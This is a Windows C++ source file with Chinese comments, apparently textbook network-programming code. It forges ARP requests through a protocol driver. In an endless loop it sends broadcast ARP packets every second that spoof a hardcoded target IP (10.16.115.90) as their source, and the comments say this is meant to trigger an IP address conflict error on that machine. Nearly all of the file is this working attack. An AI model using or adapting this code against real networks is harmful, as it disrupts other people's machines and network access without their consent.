////////////////////////////////////////////////
// CollideIP.cpp文件

#include "../common/initsock.h"

#include <windows.h>
#include <stdio.h>

#include "protoutils.h"
#include "ProtoPacket.h"

#include "Iphlpapi.h"
#pragma comment(lib, "Iphlpapi.lib")


DWORD WINAPI SendThread(LPVOID lpParam);
BOOL GetGlobalData();

/////////////////////////////////////////
// 全局数据
u_char	g_ucLocalMac[6];	// 本地MAC地址
DWORD	g_dwGatewayIP;		// 网关IP地址
DWORD	g_dwLocalIP;		// 本地IP地址
DWORD	g_dwMask;			// 子网掩码


CInitSock theSock;



void CollideTargetIP(CArpPacket *pArp, DWORD dwDestIP);

int main()
{
	// 获取全局数据
	GetGlobalData();
	// 启动服务
	if(!ProtoStartService())
	{
		printf(" ProtoStartService() failed %d \n", ::GetLastError());
		return -1;
	}
	// 打开控制设备对象
	HANDLE hControlDevice = ProtoOpenControlDevice();
	if(hControlDevice == INVALID_HANDLE_VALUE)
	{
		printf(" ProtoOpenControlDevice() failed() %d \n", ::GetLastError());
		ProtoStopService();
		return -1;
	}
	// 枚举绑定的下层适配器
	CPROTOAdapters adapters;
	if(!adapters.EnumAdapters(hControlDevice))
	{
		printf(" Enume adapter failed \n");
		ProtoStopService();
		return -1;
	}

	////////////////////////////////////////////////////////////////////////
	// 下面开始进行LAN扫描

	CAdapter adapter;
	// 默认使用第一个适配器
	if(!adapter.OpenAdapter(adapters.m_pwszSymbolicLink[0], TRUE))
	{
		printf(" OpenAdapter failed \n");
		ProtoStopService();
		return -1;
	}

	CArpPacket arp(&adapter);
	CArpPacket *pArp = &arp;

/////////////////////////////////////////////////////////////////////////	

	// 造成对方IP地址冲突
	char szDestIP[] = "10.16.115.90";
	while(TRUE)
	{
		// pArp是一个已经初始化的CArpPacket对象的指针
		CollideTargetIP(pArp, ::inet_addr(szDestIP));
		::Sleep(1000);
	}

	ProtoStopService();
	return 0;
}

void CollideTargetIP(CArpPacket *pArp, DWORD dwDestIP)
{
	// 向目的IP发送一个ARP请求，让这个ARP请求包中的源IP地址与dwDestIP一样
	// 便会使对方机器出现 IP地址冲突 系统错误。
	u_char destmacEther[6] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };
	u_char destmacArp[6] = { 0 }; 

	pArp->SendPacket(destmacEther, g_ucLocalMac, 
			ARPOP_REQUEST, destmacEther, dwDestIP, g_ucLocalMac, dwDestIP); 
}

BOOL GetGlobalData()
{
	PIP_ADAPTER_INFO pAdapterInfo = NULL;
	ULONG ulLen = 0;

	// 为适配器结构申请内存
	::GetAdaptersInfo(pAdapterInfo,&ulLen);
	pAdapterInfo = (PIP_ADAPTER_INFO)::GlobalAlloc(GPTR, ulLen);

	// 取得本地适配器结构信息
	if(::GetAdaptersInfo(pAdapterInfo,&ulLen) ==  ERROR_SUCCESS)
	{
		if(pAdapterInfo != NULL)
		{
			memcpy(g_ucLocalMac, pAdapterInfo->Address, 6);
			g_dwGatewayIP = ::inet_addr(pAdapterInfo->GatewayList.IpAddress.String);
			g_dwLocalIP = ::inet_addr(pAdapterInfo->IpAddressList.IpAddress.String);
			g_dwMask = ::inet_addr(pAdapterInfo->IpAddressList.IpMask.String);
		}
	}
	::GlobalFree(pAdapterInfo);

	printf(" \n -------------------- 本地主机信息 -----------------------\n\n");
	in_addr in;
	in.S_un.S_addr = g_dwLocalIP;
	printf("      IP Address : %s \n", ::inet_ntoa(in));

	in.S_un.S_addr = g_dwMask;
	printf("     Subnet Mask : %s \n", ::inet_ntoa(in));

	in.S_un.S_addr = g_dwGatewayIP;
	printf(" Default Gateway : %s \n", ::inet_ntoa(in));

	u_char *p = g_ucLocalMac;
	printf("     MAC Address : %02X-%02X-%02X-%02X-%02X-%02X \n", p[0], p[1], p[2], p[3], p[4], p[5]);

	printf(" \n \n ");

	return TRUE;
}
